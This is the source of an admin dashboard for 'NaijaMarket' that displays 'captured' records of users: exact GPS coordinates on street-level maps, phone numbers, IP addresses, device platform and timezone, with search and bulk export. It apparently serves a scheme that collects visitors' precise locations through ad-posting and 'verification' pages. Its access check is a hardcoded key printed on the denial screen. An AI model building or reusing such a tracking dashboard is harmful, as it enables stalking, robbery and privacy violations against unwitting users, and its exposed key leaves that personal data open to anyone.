<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel | NaijaMarket - Live GPS Map View</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: #0a0c15; color: #f1f5f9; padding: 24px; }
        .admin-header { background: linear-gradient(135deg, #1a1a2e, #16213e); padding: 28px 36px; border-radius: 28px; margin-bottom: 30px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 20px; border: 1px solid #e65c00; }
        .admin-header h1 { font-size: 28px; display: flex; align-items: center; gap: 15px; }
        .admin-header h1 i { color: #e65c00; }
        .stats-badge { background: rgba(230,92,0,0.2); padding: 12px 28px; border-radius: 60px; font-size: 15px; font-weight: 600; border: 1px solid #e65c00; }
        .controls { display: flex; gap: 15px; margin-bottom: 30px; flex-wrap: wrap; }
        .search-box { flex: 1; padding: 14px 24px; background: #1e293b; border: 1px solid #334155; border-radius: 60px; color: white; font-size: 14px; outline: none; }
        .search-box:focus { border-color: #e65c00; }
        .refresh-btn, .export-btn, .clear-btn { padding: 14px 28px; border-radius: 60px; color: white; font-weight: 600; cursor: pointer; border: none; transition: 0.2s; }
        .refresh-btn { background: #3b82f6; }
        .export-btn { background: #e65c00; }
        .clear-btn { background: #ef4444; }
        .stats-row { display: flex; gap: 20px; margin-bottom: 30px; flex-wrap: wrap; }
        .stat-box { background: #1e293b; padding: 20px; border-radius: 20px; flex: 1; min-width: 150px; text-align: center; border-left: 4px solid #e65c00; }
        .stat-box .number { font-size: 32px; font-weight: 800; color: #e65c00; }
        .stat-box .label { font-size: 12px; color: #94a3b8; margin-top: 5px; }
        .data-container { display: flex; flex-direction: column; gap: 24px; max-height: calc(100vh - 280px); overflow-y: auto; padding-right: 8px; }
        .data-card { background: #13132a; border-radius: 24px; padding: 24px; border-left: 6px solid #e65c00; transition: 0.2s; }
        .data-card:hover { background: #1a1a35; transform: translateX(4px); }
        .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 12px; padding-bottom: 12px; border-bottom: 1px solid #2d3a5e; }
        .badge { padding: 6px 18px; border-radius: 40px; font-size: 12px; font-weight: 700; }
        .badge-ad { background: #22c55e; color: #000; }
        .badge-location { background: #8b5cf6; color: #fff; }
        .badge-verify { background: #f59e0b; color: #000; }
        .delete-btn { background: #ef4444; border: none; padding: 6px 18px; border-radius: 40px; color: white; cursor: pointer; font-size: 12px; font-weight: 600; }
        .info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px; margin: 15px 0; }
        .info-card { background: rgba(0,0,0,0.35); padding: 14px 18px; border-radius: 16px; }
        .info-label { font-size: 11px; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.8px; margin-bottom: 6px; display: flex; align-items: center; gap: 6px; }
        .info-value { font-size: 14px; font-weight: 500; word-break: break-word; color: #e2e8f0; }
        .location-box { background: linear-gradient(135deg, rgba(230,92,0,0.15), rgba(230,92,0,0.05)); padding: 18px; border-radius: 20px; margin-top: 15px; border: 1px solid rgba(230,92,0,0.4); }
        .map-container { width: 100%; height: 280px; border-radius: 18px; overflow: hidden; margin: 15px 0; border: 2px solid #e65c00; }
        .coordinates { font-family: monospace; background: rgba(0,0,0,0.6); padding: 6px 12px; border-radius: 10px; font-size: 13px; }
        .street-view-link { background: #1e293b; padding: 8px 14px; border-radius: 30px; font-size: 12px; display: inline-flex; align-items: center; gap: 8px; margin-top: 10px; }
        .street-view-link a { color: #3b82f6; text-decoration: none; }
        .empty-state { text-align: center; padding: 80px; color: #64748b; }
        @media (max-width: 768px) { body { padding: 16px; } .info-grid { grid-template-columns: 1fr; } .map-container { height: 220px; } }
    </style>
</head>
<body>
    <div class="admin-header">
        <h1><i class="fas fa-map-marked-alt"></i> NaijaMarket — Live GPS & Street Map Dashboard</h1>
        <div class="stats-badge"><i class="fas fa-database"></i> <span id="recordCount">0</span> Total Records</div>
    </div>
    
    <div class="stats-row">
        <div class="stat-box"><div class="number" id="adsCount">0</div><div class="label">Total Ads Posted</div></div>
        <div class="stat-box"><div class="number" id="locationCount">0</div><div class="label">GPS Locations Captured</div></div>
        <div class="stat-box"><div class="number" id="uniqueUsers">0</div><div class="label">Unique IPs</div></div>
    </div>
    
    <div class="controls">
        <input type="text" class="search-box" id="searchInput" placeholder="🔍 Search by title, location, street, city, state, phone, IP...">
        <button class="refresh-btn" id="refreshBtn"><i class="fas fa-sync-alt"></i> Refresh</button>
        <button class="export-btn" id="exportBtn"><i class="fas fa-download"></i> Export JSON</button>
        <button class="clear-btn" id="clearBtn"><i class="fas fa-trash-alt"></i> Clear All</button>
    </div>
    
    <div class="data-container" id="dataContainer">
        <div class="empty-state"><i class="fas fa-spinner fa-pulse"></i> Loading captured GPS data...</div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const adminKey = urlParams.get("key");
        const ADMIN_SECRET = "NAIJA2025DOPE";
        
        if (adminKey !== ADMIN_SECRET) {
            document.body.innerHTML = `<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0c15;"><div style="text-align:center;background:#1e293b;padding:50px;border-radius:40px;"><i class="fas fa-lock" style="font-size:70px;color:#ef4444;"></i><h2 style="margin-top:25px;">Access Denied</h2><p style="color:#94a3b8;">Valid admin key required</p><p style="color:#64748b; margin-top:15px; font-size:12px;">Use: ?key=NAIJA2025DOPE</p></div></div>`;
            throw new Error("Unauthorized");
        }
        
        let allRecords = [];
        let activeMaps = {};
        
        async function loadData() {
            try {
                const response = await fetch('/api/fetch');
                if (response.ok) {
                    const data = await response.json();
                    allRecords = data.records || [];
                } else {
                    throw new Error('Backend error');
                }
            } catch (err) {
                const stored = localStorage.getItem('naijamarket_data');
                allRecords = stored ? JSON.parse(stored) : [];
            }
            renderData();
            updateStatsSummary();
        }
        
        async function updateStatsSummary() {
            try {
                const res = await fetch('/api/stats');
                if (res.ok) {
                    const stats = await res.json();
                    document.getElementById('adsCount').innerText = stats.ads || 0;
                    document.getElementById('locationCount').innerText = stats.locations || 0;
                    document.getElementById('uniqueUsers').innerText = stats.uniqueIps || 0;
                    document.getElementById('recordCount').innerText = stats.total || 0;
                    return;
                }
            } catch(e) {}
            const ads = allRecords.filter(r => r.type === 'ad_posted').length;
            const locations = allRecords.filter(r => r.location && r.location.lat).length;
            const uniqueIPs = new Set(allRecords.map(r => r.device?.ip || r.ip).filter(ip => ip && ip !== 'unknown')).size;
            document.getElementById('adsCount').innerText = ads;
            document.getElementById('locationCount').innerText = locations;
            document.getElementById('uniqueUsers').innerText = uniqueIPs;
            document.getElementById('recordCount').innerText = allRecords.length;
        }
        
        function initMapForCard(mapId, lat, lng, title) {
            if (!lat || !lng) return;
            setTimeout(() => {
                const container = document.getElementById(mapId);
                if (!container) return;
                if (activeMaps[mapId]) activeMaps[mapId].remove();
                const map = L.map(mapId).setView([lat, lng], 18);
                L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png', {
                    attribution: '&copy; OSM & CartoDB',
                    subdomains: 'abcd',
                    maxZoom: 20
                }).addTo(map);
                L.marker([lat, lng], {
                    icon: L.divIcon({ className: 'custom-marker', html: '<div style="background:#e65c00; width:24px; height:24px; border-radius:50%; border:3px solid white;"></div>', iconSize: [24, 24] })
                }).addTo(map).bindPopup(`<b>📍 EXACT LOCATION</b><br>${title || 'Captured point'}<br><span style="font-size:11px;">${lat.toFixed(6)}, ${lng.toFixed(6)}</span>`).openPopup();
                L.circle([lat, lng], { radius: 25, color: '#e65c00', weight: 2, fillColor: '#ff8c00', fillOpacity: 0.2 }).addTo(map);
                activeMaps[mapId] = map;
            }, 100);
        }
        
        function renderData() {
            const container = document.getElementById('dataContainer');
            const searchTerm = document.getElementById('searchInput').value.toLowerCase();
            let filtered = allRecords.filter(record => {
                const adTitle = record.ad?.title || '';
                const adLocation = record.ad?.location || '';
                const phone = record.ad?.phone || '';
                const locCity = record.location?.city || '';
                const locState = record.location?.state || '';
                const locStreet = record.location?.street || '';
                const ipAddr = record.device?.ip || record.ip || '';
                return adTitle.toLowerCase().includes(searchTerm) || adLocation.toLowerCase().includes(searchTerm) ||
                    phone.toLowerCase().includes(searchTerm) || locCity.toLowerCase().includes(searchTerm) ||
                    locState.toLowerCase().includes(searchTerm) || locStreet.toLowerCase().includes(searchTerm) || ipAddr.includes(searchTerm);
            });
            if (filtered.length === 0) {
                container.innerHTML = `<div class="empty-state"><i class="fas fa-map-marked-alt"></i> No data found.</div>`;
                return;
            }
            container.innerHTML = filtered.map((record, idx) => {
                const isAd = record.type === 'ad_posted';
                const isVerify = record.type === 'verification';
                const loc = record.location;
                const hasValidCoords = loc && loc.lat && loc.lng && typeof loc.lat === 'number';
                const mapId = `map_${record.id}_${idx}`;
                if (hasValidCoords) setTimeout(() => initMapForCard(mapId, loc.lat, loc.lng, record.ad?.title || 'Location'), 50);
                
                let badgeClass = 'badge-location';
                let badgeText = '<i class="fas fa-map-marker-alt"></i> LOCATION';
                if (isAd) { badgeClass = 'badge-ad'; badgeText = '<i class="fas fa-ad"></i> AD POSTED'; }
                if (isVerify) { badgeClass = 'badge-verify'; badgeText = '<i class="fas fa-shield-alt"></i> VERIFICATION'; }
                
                return `<div class="data-card">
                    <div class="card-header">
                        <div><span class="badge ${badgeClass}">${badgeText}</span><span style="margin-left:12px; font-size:12px; color:#64748b;"><i class="far fa-clock"></i> ${new Date(record.timestamp).toLocaleString()}</span></div>
                        <button class="delete-btn" onclick="deleteRecord(${record.id})"><i class="fas fa-trash"></i> Delete</button>
                    </div>
                    ${isAd ? `<div class="info-grid"><div class="info-card"><div class="info-label"><i class="fas fa-tag"></i> Category</div><div class="info-value">${escapeHtml(record.ad?.category)}</div></div>
                    <div class="info-card"><div class="info-label"><i class="fas fa-heading"></i> Title</div><div class="info-value"><strong>${escapeHtml(record.ad?.title)}</strong></div></div>
                    <div class="info-card"><div class="info-label"><i class="fas fa-naira-sign"></i> Price</div><div class="info-value">${escapeHtml(record.ad?.price)}</div></div></div>
                    <div class="info-card"><div class="info-label"><i class="fas fa-align-left"></i> Description</div><div class="info-value">${escapeHtml((record.ad?.description || '').substring(0, 200))}</div></div>
                    <div class="info-grid"><div class="info-card"><div class="info-label"><i class="fas fa-map-marker-alt"></i> User Location</div><div class="info-value">${escapeHtml(record.ad?.location)}</div></div>
                    <div class="info-card"><div class="info-label"><i class="fab fa-whatsapp"></i> Phone</div><div class="info-value">${escapeHtml(record.ad?.phone)}</div></div></div>` : ''}
                    ${loc ? `<div class="location-box"><div class="location-title"><i class="fas fa-satellite-dish"></i> 🛰️ GPS STREET LOCATION</div>
                    ${hasValidCoords ? `<div id="${mapId}" class="map-container"></div>` : '<div style="background:#330000; padding:15px; border-radius:16px;">No GPS coordinates</div>'}
                    <div class="info-grid"><div class="info-card"><div class="info-label"><i class="fas fa-road"></i> Street</div><div class="info-value">${escapeHtml(loc.street || 'N/A')}</div></div>
                    <div class="info-card"><div class="info-label"><i class="fas fa-city"></i> City</div><div class="info-value">${escapeHtml(loc.city || 'N/A')}</div></div>
                    <div class="info-card"><div class="info-label"><i class="fas fa-building"></i> State</div><div class="info-value">${escapeHtml(loc.state || 'N/A')}</div></div></div>
                    <div class="info-card"><div class="info-label"><i class="fas fa-location-dot"></i> Coordinates</div><div class="info-value"><span class="coordinates">Lat: ${loc.lat || 'N/A'}, Lng: ${loc.lng || 'N/A'}</span></div></div>
                    ${hasValidCoords ? `<div class="street-view-link"><i class="fab fa-google"></i> <a href="https://www.google.com/maps?q=${loc.lat},${loc.lng}&z=20" target="_blank">🔍 Open in Google Maps</a> | <a href="https://www.openstreetmap.org/?mlat=${loc.lat}&mlon=${loc.lng}&zoom=19" target="_blank">🗺️ OpenStreetMap</a></div>` : ''}</div>` : ''}
                    ${record.device ? `<div class="info-grid"><div class="info-card"><div class="info-label"><i class="fas fa-microchip"></i> Platform</div><div class="info-value">${escapeHtml(record.device.platform)}</div></div>
                    <div class="info-card"><div class="info-label"><i class="fas fa-globe"></i> IP</div><div class="info-value"><code>${escapeHtml(record.device.ip || record.ip)}</code></div></div>
                    <div class="info-card"><div class="info-label"><i class="far fa-clock"></i> Timezone</div><div class="info-value">${escapeHtml(record.device.timezone)}</div></div></div>` : ''}
                </div>`;
            }).join('');
            setTimeout(() => { filtered.forEach((record, idx) => { const loc = record.location; if (loc?.lat && loc?.lng) initMapForCard(`map_${record.id}_${idx}`, loc.lat, loc.lng, record.ad?.title); }); }, 200);
        }
        
        function escapeHtml(str) { if (!str) return ''; return String(str).replace(/[&<>]/g, function(m) { if (m === '&') return '&amp;'; if (m === '<') return '&lt;'; if (m === '>') return '&gt;'; return m; }); }
        
        async function deleteRecord(id) {
            if (confirm('Delete this record?')) {
                try { await fetch(`/api/delete/${id}`, { method: 'DELETE' }); } catch(e) {}
                allRecords = allRecords.filter(r => r.id !== id);
                localStorage.setItem('naijamarket_data', JSON.stringify(allRecords));
                Object.keys(activeMaps).forEach(key => { if (activeMaps[key]) activeMaps[key].remove(); });
                activeMaps = {};
                renderData();
                updateStatsSummary();
            }
        }
        
        async function clearAllData() {
            if (confirm('⚠️ DELETE ALL DATA? This is irreversible.')) {
                try { await fetch('/api/clear', { method: 'DELETE' }); } catch(e) {}
                localStorage.removeItem('naijamarket_data');
                allRecords = [];
                Object.keys(activeMaps).forEach(key => { if (activeMaps[key]) activeMaps[key].remove(); });
                activeMaps = {};
                renderData();
                updateStatsSummary();
            }
        }
        
        function exportData() {
            const dataStr = JSON.stringify(allRecords, null, 2);
            const blob = new Blob([dataStr], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `naijamarket-export-${new Date().toISOString()}.json`;
            a.click();
            URL.revokeObjectURL(url);
        }
        
        document.getElementById('refreshBtn').addEventListener('click', () => loadData());
        document.getElementById('clearBtn').addEventListener('click', clearAllData);
        document.getElementById('exportBtn').addEventListener('click', exportData);
        document.getElementById('searchInput').addEventListener('input', () => { Object.keys(activeMaps).forEach(key => { if (activeMaps[key]) activeMaps[key].remove(); }); activeMaps = {}; renderData(); });
        
        loadData();
        setInterval(loadData, 8000);
        window.deleteRecord = deleteRecord;
    </script>
</body>
</html>
